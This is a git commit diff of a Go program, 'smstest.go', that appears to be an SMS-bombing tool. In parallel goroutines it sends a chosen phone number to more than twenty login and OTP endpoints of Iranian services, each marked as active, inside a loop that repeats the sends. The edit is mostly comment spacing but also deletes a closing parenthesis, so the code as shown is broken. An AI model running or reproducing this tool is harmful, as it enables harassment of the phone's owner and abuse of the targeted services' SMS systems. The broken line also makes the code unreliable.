062e01c268de08a8a2504150441d265888fdf9ae
monsmain <matinfarmani20@gmail.com>
2025-04-24 18:11:15 +0330

    Update smstest.go

--- smstest.go
+++ smstest.go
@@ -128,80 +128,80 @@ func main() {
 		}, ch)  //active✅
 		go sms("https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
 			"mobile": phone,
-		}, ch)     //active✅
+		}, ch)  //active✅
 		go sms("https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
 			"username": phone,
-		}, ch)    //active✅
+		}, ch)  //active✅
 		go sms("https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
 			"phone": phone,
-		}, ch)    //active✅
+		}, ch)  //active✅
 		go sms("https://api.iranicard.ir/api/v1/register", map[string]interface{}{
 			"mobile": phone,
-		}, ch)    //active✅
+		}, ch)  //active✅
 		go sms("https://alopeyk.com/api/sms/send.php", map[string]interface{}{
 			"phone": phone,
-		}, ch)   //active✅
+		}, ch)  //active✅
 		go sms("https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{
 			"phone": phone,
-		}, ch)    //active✅
+		}, ch)  //active✅
 		go sms("https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
 			"phoneNumber": phone,
-		}, ch)    //active✅
+		}, ch)  //active✅
 		go sms("https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
 			"username": phone,
-		}, ch)    //active✅
+		}, ch)  //active✅
 		go sms("https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
 			"phone": phone,
-		}, ch)    //active✅
+		}, ch)  //active✅
 		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
 			"cellphone": phone,
-		}, ch)  // active✅
+		}, ch) // active✅
 		go sms("https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
 			"phone": phone,
-		}, ch)  // active✅
+		}, ch  // active✅
 		go sms("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0", map[string]interface{}{
 		 	"cellphone": phone,
                 }, ch) // active✅
 		go sms("https://api.nobat.ir/patient/login/phone", map[string]interface{}{
 			"mobile": phone,
-		}, ch)  // active✅
+		}, ch) // active✅
 		go sms("https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{
 			"username": phone,
-		}, ch)  // active✅
+		}, ch) // active✅
 		go sms("https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
 			"phone_number": phone,
-		}, ch)  // active✅
+		}, ch) // active✅
 		go sms("https://api.sibbank.ir/v1/auth/login", map[string]interface{}{
 			"phone_number": phone,
-		}, ch)  // active✅
+		}, ch) // active✅
 		go sms("https://sandbox.sibirani.ir/api/v1/user/invite", map[string]interface{}{
 			"username": phone,
-		}, ch) // active ✅
+		}, ch) //active ✅
 		go sms("https://sandbox.sibirani.com/api/v1/developer/generator-inv-token", map[string]interface{}{
 			"username": phone,
-		}, ch) // active ✅
+		}, ch) //active ✅
 		go sms("https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
 			"mobileNumber": phone,
-		}, ch)  // active ✅
+		}, ch) //active ✅
 		go sms("https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{
 			"mobile": phone,
-		}, ch)  // active ✅
+		}, ch) //active ✅
 		go sms("https://api.bitycle.com/api/account/request_otp", map[string]interface{}{
 			"phone": phone,
-		}, ch)  // active ✅
+		}, ch) //active ✅
 		go sms("https://core.gapfilm.ir/api/v3.2/Account/Login", map[string]interface{}{
 			"PhoneNo": phone,
-		}, ch)  // active ✅
+		}, ch) //active ✅
 		go sms("https://api.pindo.ir/v1/user/login-register/", map[string]interface{}{
 			"phone": phone,
-		}, ch)  // active ✅
+		}, ch) //active ✅
 		s5 := fmt.Sprintf("'credential': {'phoneNumber': %s, 'role': 'PASSENGER'}", phone)
 		go sms("https://tap33.me/api/v2/user", map[string]interface{}{
 			s5: phone,
-		}, ch)  // active ✅
+		}, ch) //active ✅
 		go sms("https://tap33.me/api/v2/user", map[string]interface{}{
 			"phoneNumber": phone,
-		}, ch)  // active ✅
+		}, ch) //active ✅
 
 
 	for i := 0; i < repeatCount; i++ {
